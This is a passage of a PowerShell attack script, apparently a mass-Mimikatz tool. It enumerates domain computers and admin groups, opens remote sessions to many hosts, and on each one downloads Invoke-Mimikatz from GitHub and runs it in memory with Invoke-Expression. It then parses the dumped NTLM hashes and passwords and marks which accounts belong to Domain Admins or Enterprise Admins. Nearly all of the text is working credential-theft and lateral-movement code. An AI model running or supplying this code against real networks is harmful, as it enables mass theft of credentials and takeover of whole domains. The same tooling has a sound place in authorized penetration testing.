                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]

                    [string]$SearchDN
                )

                Write-verbose "Getting list of Servers from DC..."

                # Get domain computers from dc 
                if ($OsFilter -eq "*"){
                    $OsCompFilter = "(operatingsystem=*)"
                }else{
                    $OsCompFilter = "(operatingsystem=*$OsFilter*)"
                }

                # Select winrm spns if flagged
                if($WinRM){
                    $winrmComFilter = "(servicePrincipalName=*WSMAN*)"
                }else{
                    $winrmComFilter = ""
                }

                $CompFilter = "(&(objectCategory=Computer)$winrmComFilter $OsCompFilter)"        
                $ObjSearcher.PageSize = $Limit
                $ObjSearcher.Filter = $CompFilter
                $ObjSearcher.SearchScope = "Subtree"

                if ($SearchDN)
                {
                    $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")         
                }

                $ObjSearcher.FindAll() | ForEach-Object {
            
                    #add server to data table
                    $ComputerName = [string]$_.properties.dnshostname                    
                    $TblServers.Rows.Add($ComputerName) | Out-Null 
                }
            }

            # ----------------------------------------
            # Function to check group membership 
            # ----------------------------------------        
            function Get-GroupMember
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [string]$Group = "Domain Admins",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]
                    [string]$SearchDN
                )
  
                if ($DomainController -and $Credential.GetNetworkCredential().Password)
                   {
                        $root = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $rootdn = $root | select distinguishedName -ExpandProperty distinguishedName
                        $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/CN=$Group, CN=Users,$rootdn" , $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
                    else
                    {
                        $root = ([ADSI]"").distinguishedName
                        $objDomain = [ADSI]("LDAP://CN=$Group, CN=Users," + $root)  
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
        
                    # Create data table to house results to return
                    $TblMembers = New-Object System.Data.DataTable 
                    $TblMembers.Columns.Add("GroupMember") | Out-Null 
                    $TblMembers.Clear()

                    $objDomain.member | %{                    
                        $TblMembers.Rows.Add($_.split("=")[1].split(",")[0]) | Out-Null 
                }

                return $TblMembers
            }

            # ----------------------------------------
            # Mimikatz parse function (Will Schoeder's) 
            # ----------------------------------------

            # This is a *very slightly mod version of will schroeder's function from:
            # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
            function Parse-Mimikatz {

                [CmdletBinding()]
                param(
                    [string]$raw
                )
    
                # Create data table to house results
                $TblPasswords = New-Object System.Data.DataTable 
                $TblPasswords.Columns.Add("PwType") | Out-Null
                $TblPasswords.Columns.Add("Domain") | Out-Null
                $TblPasswords.Columns.Add("Username") | Out-Null
                $TblPasswords.Columns.Add("Password") | Out-Null    

                # msv
	            $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("NTLM")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "msv"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/tspkg"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/kerberos"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "kerberos/ssp"
                                $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }

                # Remove the computer accounts
                $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}

                return $TblPasswords_Clean
            }
        }

        # Conduct attack
        Process 
        {

            # ----------------------------------------
            # Compile list of target systems
            # ----------------------------------------

            # Get list of systems from the command line / pipeline            
            if ($Hosts)
            {
                Write-verbose "Getting list of Servers from provided hosts..."
                $Hosts | 
                %{ 
                    $TblServers.Rows.Add($_) | Out-Null 
                }
            }

            # Get list of systems from the command line / pipeline
            if($HostList){
                Write-verbose "Getting list of Servers $HostList..."                
                if (Test-Path -Path $HostList){
                    $HostListHosts += Get-Content -Path $HostList
                    $HostListHosts|
                    %{
                        $TblServers.Rows.Add($_) | Out-Null
                    }
                }else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                }            
            }

            # Get list of domain systems from dc and add to the server list
            if ($AutoTarget)
            {
                if ($OsFilter){
                    $FlagOsFilter = "$OsFilter"
                }else{
                    $FlagOsFilter = "*"
                }


                if ($WinRM){
                    Get-DomainComputers -WinRM -OsFilter $OsFilter
                }else{
                    Get-DomainComputers -OsFilter $OsFilter
                }
            }


            # ----------------------------------------
            # Get list of entrprise/domain admins
            # ----------------------------------------
            if ($AutoTarget)
            {
                Write-Verbose "Getting list of Enterprise and Domain Admins..."
                if ($DomainController -and $Credential.GetNetworkCredential().Password)            
                {           
                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins" -DomainController $DomainController -Credential $Credential
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins" -DomainController $DomainController -Credential $Credential
                }else{

                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins"
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins"
                }
            }


            # ----------------------------------------
            # Establish sessions
            # ---------------------------------------- 
            $ServerCount = $TblServers.Rows.Count

            if($ServerCount -eq 0){
                Write-Verbose "No target systems were provided."
                break
            }

            if($ServerCount -lt $MaxHosts){
                $MaxHosts = $ServerCount
            }

            Write-Verbose "Found $ServerCount servers that met search criteria."            
            Write-verbose "Attempting to create $MaxHosts ps sessions..."

            # Set counters
            $ServerCounter = 0     
            $SessionCount = 0   

            $TblServers | 
            ForEach-Object {
                if ($ServerCounter -le $ServerCount -and $SessionCount -lt $MaxHosts){

                    $ServerCounter = $ServerCounter+1
                
                    # attempt session
                    [string]$MyComputer = $_.ComputerName    
                    
                    New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue -ThrottleLimit $MaxHosts | Out-Null          
                    
                    # Get session count
                    $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count
                    Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processed server $ServerCounter of $ServerCount - $MyComputer"         
                }
            }  
            
                        
            # ---------------------------------------------
            # Attempt to run mimikatz against open sessions
            # ---------------------------------------------
            if($SessionCount -ge 1){

                # run the mimikatz command
                Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
                $x = Get-PSSession
                [string]$MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1");invoke-mimikatz -ErrorAction SilentlyContinue} -ErrorAction SilentlyContinue           
                $TblResults = Parse-Mimikatz -raw $MimikatzOutput
                $TblResults | foreach {
            
                    [string]$pwtype = $_.pwtype.ToLower()
                    [string]$pwdomain = $_.domain.ToLower()
                    [string]$pwusername = $_.username.ToLower()
                    [string]$pwpassword = $_.password
                    
                    # Check if user has da/ea privs - requires autotarget
                    if ($AutoTarget)
                    {
                        $ea = "No"
                        $da = "No"

                        # Check if user is enterprise admin                   
                        $EnterpriseAdmins |
                        ForEach-Object {
                            $EaUser = $_.GroupMember
                            if ($EaUser -eq $pwusername){
                                $ea = "Yes"
                            }
                        }
                    
                        # Check if user is domain admin
                        $DomainAdmins |
                        ForEach-Object {
                            $DaUser = $_.GroupMember
                            if ($DaUser -eq $pwusername){
                                $da = "Yes"
                            }
                        }
                    }else{
                        $ea = "Unknown"
                        $da = "Unknown"
                    }

                    # Add credential to list
                    $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword,$ea,$da) | Out-Null
                }            

                # remove sessions
                Write-verbose "Removing ps sessions..."
                Disconnect-PSSession -Session $x | Out-Null
                Remove-PSSession -Session $x | Out-Null

            }else{
                Write-verbose "No ps sessions could be created."
            }                 
        }

        # Clean and results
        End
        {
                # Clear server list
                $TblServers.Clear()

                # Return passwords
                if ($TblPasswordList.row.count -eq 0){
                    Write-Verbose "No credentials were recovered."
                    Write-Verbose "Done."
                }else{
                    $TblPasswordList | select domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                }                
        }
    }
